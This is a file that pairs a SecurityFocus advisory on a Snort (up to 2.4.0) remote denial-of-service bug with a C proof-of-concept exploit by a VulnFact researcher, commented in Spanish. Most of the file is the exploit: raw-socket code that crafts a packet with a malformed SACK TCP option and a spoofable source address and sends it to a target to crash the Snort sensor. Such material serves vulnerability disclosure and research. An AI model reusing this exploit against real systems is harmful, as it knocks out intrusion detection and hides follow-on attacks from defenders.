@@ -1,0 +1,186 @@
+source: http://www.securityfocus.com/bid/14811/info
+
+Snort is reported prone to a remote denial of service vulnerability. The vulnerability is reported to exist in the 'PrintTcpOptions()' function of 'log.c', and is a result of a failure to sufficiently handle malicious TCP packets.
+
+A remote attacker may trigger this vulnerability to crash a remote Snort server and in doing so may prevent subsequent malicious attacks from being detected.
+
+It should be noted that the vulnerable code path is only executed when Snort is run with the '-v' (verbose) flag. Due to the performance penalty of running the Snort application in verbose mode, it is likely that most production installations of the application are not vulnerable to this issue.
+
+Update: Further messages have stated that other paths to the vulnerable code may be possible. Using the 'frag3' preprocessor, ASCII mode logging, the '-A fast' command-line option, and possibly other options may expose Snort to this vulnerability. Please see the referenced messages for further information. 
+
+/*_------------------------------------------_
+||------+ Snort <= 2.4.0 Trigger p0c +------||
+||__________________________________________||
+||--=[ nitrous [at] vulnfact [dot] com  ]=--||
+||--=[      VulnFact Security Labs      ]=--||
+||--=[           21 Ago 2oo5            ]=--||
+||--=[              Mexico              ]=--||
+||__________________________________________||
+ -__________________________________________-
+
+Snort <= 2.4.0 SACK TCP Option Error Handling
+Este c?digo envia al  especificado un paquete TCP/IP con 4 bytes extras
+correspondientes al campo TCP Options [TCP Header].
+Estos 4 bytes son "\x05\x02\x00\x00". NOTA !!!: Snort solamente cae cuando se
+esta corriendo en verbose mode (-v).
+
+Esto solo funciona testeando de una maquina a otra directamente conectadas
+(1 solo salto; Ej. En una red LAN de PC a PC). No funciona desde Internet,
+por
+que el campo TCP->th_sum es 0 (cero), por lo tanto, el primer Router por
+donde
+pase este paquete lo descartara por no tener una checksum valida.
+
+RFC #1072 - TCP Extensions for Long-Delay Paths
+
+3.2- TCP SACK Option:
+     ...
+     Kind: 5
+     Length: Variable
+     +--------+--------+--------+--------+--------+--------+
+     | Kind=5 | Length | Relative Origin |   Block Size    |
+     +--------+--------+--------+--------+--------+--------+
+
+Analizando el packete con 'tcpdump' en OpenBSD 3.5 vemos:
+11:17:53.093264 ip: 127.0.0.1.29383 > 127.0.0.1.80: S 213975407:213975407(0)
+win 5840
+<malformed sack [len 0] ,eol>
+0000: 4500 002c bc4f 0000 ff06 017a 7f00 0001  E..,??O..??..z....
+0010: 7f00 0001 72c7 0050 0cc1 016f 43f1 8422  ....r??.P.??.oC??."
+0020: 6002 16d0 3caf 0000 0502 0000            `..??<??......
+
+Testeado en:
+[+] snort 2.4.0 @ OpenBSD 3.7 GENERIC // Yeah ;)
+[+] snort 2.4.0 @ Ubuntu Linux 5.04 "Hoary Hedgehog"
+[+] snort 2.3.2 @ Debian Linux 3.1 "Sarge"
+[+] snort 2.3.0 @ Ubuntu Linux 5.04 "Hoary Hedgehog"
+[+] snort 2.3.0 @ Red Hat Linux 9
+[+] snort 2.2.0 @ Ubuntu Linux 5.04 "Hoary Hedgehog"
+[+] snort 2.0.0 @ OpenBSD 3.5 GENERIC
+
+Saludos a vulnfact.com, CRAc, stacked, ran, dex, benn, beck, zlotan, Rowter,
+Gus, Crypkey,
+protoloco, Falckon, dymitri, #cum ppl, warlord/nologin.org por fuzzball2
+fuzzer, gcarrillog,
+JSS, y en especial a Mariit@ ( Sexy Colombiana ;) ). A la musica de "Sussie
+4" ;)...
+Federico L. Bossi Bonin
+*/
+
+#include<stdio.h>
+#include<string.h>
+#include<unistd.h>
+#include<errno.h>
+#include<netdb.h>
+#include<sys/types.h>
+#include<sys/socket.h>
+#include<netinet/in.h>
+//#define __USE_BSD     1       /* Use BSD's ip header style */
+#include<netinet/ip.h>
+#define __FAVOR_BSD     1       /* Use BSD's tcp header style */
+#include<netinet/tcp.h>
+
+#define IPSIZE  sizeof(struct ip)
+#define TCPSIZE sizeof(struct tcphdr)
+#define DEFAULT_SRC_IP  "200.31.33.70"
+
+char trigger[] = "\x05\x02\x00\x00"; /* Malformed SACK TCP Option */
+
+int usage(char *name)
+{
+        fprintf(stderr, "Usage: %s <target> [spoofed srcip]\n", name);
+        fprintf(stderr, "\t\tDefault srcip = %s\n", DEFAULT_SRC_IP);
+
+        return 0;
+}
+
+int main(int argc, char **argv)
+{
+        char *packet= (char *) malloc(IPSIZE + TCPSIZE + 4);
+        char *srcip = DEFAULT_SRC_IP;
+        int sockfd, count;
+        int one = 1; /* setsockopt() */
+        struct sockaddr_in target;
+        struct hostent *host2ip;
+        struct ip *IP = (struct ip *) packet;
+        struct tcphdr *TCP = (struct tcphdr *) (packet + IPSIZE);
+
+        if(argc < 2)
+                return(usage(*argv));
+
+        if(argc == 3)
+                srcip = argv[2];
+
+        if((host2ip = gethostbyname(argv[1])) == NULL){
+                perror("gethostbyname");
+                exit(-1);
+        }
+
+        if(getuid() != 0){
+                fprintf(stderr, "Ups!, must be r00t to perform RAW
+                sockets\n");
+                exit(-1);
+        }
+
+        memset(packet, 0x00, sizeof(packet));
+
+        memset(&target, 0x00, sizeof(target));
+        target.sin_family       = AF_INET;
+        target.sin_port         = htons(64876);
+        target.sin_addr         = *((struct in_addr *)host2ip->h_addr);
+
+        /*** BUILDING MALFORMED PACKET ***/
+        IP->ip_hl       = 0x05;
+        IP->ip_v        = 0x04;
+        IP->ip_tos      = 0x00;
+        IP->ip_len      = IPSIZE + TCPSIZE + 4;
+        IP->ip_id       = 0x00;
+        IP->ip_off      = 0x00;
+        IP->ip_ttl      = 0xff;
+        IP->ip_p        = IPPROTO_TCP;
+        IP->ip_sum      = 0x00;
+        IP->ip_src.s_addr = inet_addr(srcip);
+        IP->ip_dst.s_addr = target.sin_addr.s_addr;
+
+        TCP->th_sport   = htons(31337);
+        TCP->th_dport   = target.sin_port;
+        TCP->th_seq     = 0x00;
+        TCP->th_ack     = 0x00;
+        TCP->th_x2      = 0x00;
+        TCP->th_off     = 0x06;
+        TCP->th_flags   = 0x00; /* NO Syn ;) */
+        TCP->th_win     = htons(0xffff);
+        TCP->th_sum     = 0x00;
+        TCP->th_urp     = 0x00;
+
+        memcpy(packet + IPSIZE + TCPSIZE, trigger, 4);
+        /*** END ***/
+
+        if((sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) == -1){
+                perror("socket");
+                exit(-1);
+        }
+
+        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) ==
+        -1){
+                perror("setsockopt");
+                exit(-1);
+        }
+
+        printf("-=[ Snort <= 2.4.0 Trigger p0c\n");
+        printf("-=[ By nitr0us <nitrous[at]vulnfact[dot]com>\n\n");
+        printf("-=[ Sending Malformed TCP/IP Packet...\n");
+
+        if((count = sendto(sockfd, packet, IP->ip_len, 0, (struct sockaddr
+        *)&target, sizeof(target))) == -1){
+                perror("sendto");
+                close(sockfd);
+                exit(-1);
+        }
+
+        printf("-=[ Sent %d bytes to %s\n", count, argv[1]);
+        printf("-=[ Snort killed !\n");
+
+        close(sockfd);
+        return 0;
+}
